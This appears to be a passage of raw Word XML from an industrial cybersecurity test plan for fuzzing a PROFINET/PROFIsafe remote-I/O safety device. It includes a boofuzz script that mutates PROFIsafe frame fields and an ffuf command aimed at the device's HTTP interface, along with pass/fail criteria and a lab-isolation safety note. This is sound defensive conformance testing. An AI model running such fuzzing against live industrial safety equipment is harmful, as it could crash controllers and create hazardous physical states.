      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="02077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6AEF1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25BC4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t>Determine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whether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malformed</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> PROFINET/DCP, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">, and HTTP/IoT-Core </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>inputs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are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safely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rejected</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> (CR 3.5 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>input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validation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">, CR 3.7 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>error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handling</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">) </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>or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cause</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> a crash/hang/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>undefined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state</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> — </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>verifying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the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device</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> "</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>withstands</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">" </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>unexpected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input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without</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> a </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>hazardous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condition</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="7B267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70CE86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Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357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FDFB8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 xml:space="preserve">1. Establish OPERATE. 2. Fuzz each interface: DCP (identify/set malformed), </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> frame fields (length/CRC/control byte), HTTP requests to IoT-Core. 3. Monitor for crash/hang/watchdog reset vs safe rejection/passivation. 4. Log every input that changes device state; root-cause each.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="29E72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488C8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01A21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>PASS</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> all malformed inputs are safely rejected or resolve to passivation (Low/qualifier-bad), with no crash into an undefined/hazardous state. </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>FAIL</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> any malformed input causes a hang, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>uncommanded</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> output, or unrecoverable state (other than the defined safe state).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="23508CD3" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete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AC6357" w:rsidRPr="00AC6357" w14:paraId="5B3878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37407C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B1B9FA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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="2F9DE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6ABED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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC635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E5C0A" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t>TC-RQ010-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="5D0B8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23F4F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3A346" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t>Pi eth0 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>fuzzer</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">) + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>mgmt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path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for</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> HTTP; DUT 192.168.0.2; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>laptop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mirror</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>; PLC crash-monitor</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="39FCF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92344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lastRenderedPageBreak/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AB7E0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boofuzz</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> (ifm CM-010) </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>for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PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">/DCP; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>boofuzz</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>ffuf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for</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> HTTP; Wireshark; PLC </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>watchdog</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3823C61E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# TC-RQ010-03 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>boofuzz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> skeleton for </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PROFIsafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> frame-field fuzzing (Layer 2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F743128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from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>boofuzz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> import *</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="378EB794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>session = Session(target=Target(connection=RawL2SocketConnection("eth0")))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79257FC1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s_initialize</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>("</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>psafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EA30AE5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s_bytes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(b"\x88\x92", name="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ethertype</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">", </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fuzzable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FE5CFBA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s_bytes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(b"\x00"*4, name="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>pn_rt_hdr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">", </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fuzzable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E5EF8EB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s_bytes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(b"\x00"*8, name="pd", </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fuzzable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=True) # process data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C805438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s_byte</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(0x00, name="status", </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fuzzable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">=True) # </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PROFIsafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> status/control</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="722BC421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s_bytes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(b"\x00"*4, name="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>crc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">", </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fuzzable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=True) # 4-byte CRC</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14101363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session.connect</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>s_get</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>("</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>psafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47C477EF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session.fuzz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">() # crashes logged at </w:t>
      </w:r>
      <w:hyperlink r:id="rId260" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://127.0.0.1:26000</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5739E3CA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># HTTP/IoT-Core malformed-request fuzzing (management path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62E49FA9" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ffuf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -u </w:t>
      </w:r>
      <w:hyperlink r:id="rId261" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/FUZZ</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -w big-wordlist.txt -mc all -o TC1003_http.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77CE0A15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| </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Malformed inputs rejected or → passivation; no crash/hang/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>uncommanded</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> output; PLC watchdog registers no unsafe transition. | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ All inputs safely handled ☐ Crash/hang found (root-cause + FAIL) | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>boofuzz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> session DB, TC1003_http.json, crash payloads + timestamps, mirror PCAP, PLC state log | </w:t>
      </w:r>
      <w:hyperlink r:id="rId262" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3665B2DA" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Safety:</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> fuzzing an active safety device requires PLC crash-monitoring/watchdog per </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ifm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> CM-010; isolated Zone-B only. </w:t>
      </w:r>
      <w:hyperlink r:id="rId263" w:history="1">
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Security_T</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>rk_Kali_EN</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | Word]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="768B2C55" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357">
        <w:pict w14:anchorId="467DEE85">
          <v:rect id="_x0000_i1686" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="5430C299" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ010-05 — Outcome-Verification Aggregation Harness (EHSR success criterion; consumes cross-referenced results)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DA63C06" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357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7761"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="6C1C13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59A738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70DEB2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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="72C1A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26D16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FA536" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t>TC-RQ010-05</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="62B9F5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E2C82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E387E" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">RQ-010 (EHSR </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>success</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>criterion</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>) → CR 3.6 → Asset A, Asset E</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="71CE6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31416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6566C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All foreseeable classes (aggregate outcome check)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="02F4C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DC482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SVV </w:t>
            </w:r>
